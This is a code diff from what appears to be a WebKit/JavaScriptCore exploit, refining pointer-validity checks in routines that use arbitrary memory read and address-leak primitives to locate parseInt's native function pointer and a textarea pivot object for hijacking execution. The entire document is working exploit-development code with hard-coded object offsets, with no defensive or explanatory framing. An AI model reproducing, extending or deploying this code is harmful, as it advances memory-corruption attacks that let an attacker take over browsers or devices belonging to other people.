@@ -13,6 +13,22 @@ const M_FUNCTION_OFF = 0x28;
 const JSFUNC_EXECUTABLE_OFF = 0x18;
 const CORE_NATIVE_SS = "wk-core-native";
 
+/** JSC heap cell — same rules as mem.leakval / core.plausibleCell (0x2… is valid). */
+function plausibleCell64(p) {
+    if (!p) return false;
+    if (p.hi > 0xffff) return false;
+    if (p.low === 0 && p.hi === 0) return false;
+    if ((p.low & 7) !== 0) return false;
+    const v = (BigInt(p.hi >>> 0) << 32n) | BigInt(p.low >>> 0);
+    return v > 0x100000000n && v <= 0xffffffffffffn;
+}
+
+/** Mapped code pointer (webkit / libkernel — 0x8… range). */
+function plausibleCode64(p) {
+    if (!plausibleCell64(p)) return false;
+    return p.hi >= 0x80 && p.hi <= 0x8f;
+}
+
 function numToI64(n) {
     if (n == null) return null;
     if (typeof n === "object" && n != null && "low" in n)
@@ -83,14 +99,14 @@ export function captureParseIntLive(p, carrier) {
     try { targetCell = p.leakval(parseInt); } catch (e) {
         return { err: "leakval(parseInt): " + (e && e.message ? e.message : e) };
     }
-    if (!targetCell || targetCell.hi < 0x80)
+    if (!plausibleCell64(targetCell))
         return { err: "bad-parseInt-cell=" + targetCell };
 
     let exec;
     try { exec = p.read8(targetCell.add32(JSFUNC_EXECUTABLE_OFF)); } catch (e) {
         return { err: "read exec@+0x18: " + (e && e.message ? e.message : e) };
     }
-    if (!exec || exec.hi < 0x80)
+    if (!plausibleCell64(exec))
         return { err: "bad-exec-ptr=" + exec };
 
     const mainMf = exec.add32(M_FUNCTION_OFF);
@@ -98,7 +114,7 @@ export function captureParseIntLive(p, carrier) {
     try { mainOrig = p.read8(mainMf); } catch (e) {
         return { err: "read m_function: " + (e && e.message ? e.message : e) };
     }
-    if (!mainOrig || mainOrig.hi < 0x80)
+    if (!plausibleCode64(mainOrig))
         return { err: "bad-native-fn=" + mainOrig + "@+" + M_FUNCTION_OFF.toString(16) };
 
     let pivotCell;
@@ -140,7 +156,7 @@ export function captureFromCarrier(p, carrier, off) {
     const mainMf = exec.add32(M_FUNCTION_OFF);
     let mainOrig;
     try { mainOrig = p.read8(mainMf); } catch (_) { return null; }
-    if (!mainOrig || mainOrig.hi < 0x80) return null;
+    if (!plausibleCode64(mainOrig)) return null;
 
     let pivotObj = carrier && carrier.textarea || null;
     let pivotCell = numToI64(nat.textareaCell);
